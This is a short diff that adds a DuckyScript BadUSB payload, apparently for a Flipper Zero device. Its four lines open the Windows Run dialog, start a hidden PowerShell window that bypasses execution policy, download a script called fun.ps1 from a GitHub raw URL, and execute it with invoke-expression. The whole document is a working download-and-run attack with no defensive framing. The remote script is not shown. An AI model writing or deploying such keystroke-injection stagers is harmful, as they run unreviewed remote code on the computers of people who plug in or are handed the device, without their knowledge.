@@ -1,0 +1,4 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/daninoon/flipper-zero/main/BAD-USB/very%20good%20hack/fun.ps1?dl=1; invoke-expression $pl
+ENTER
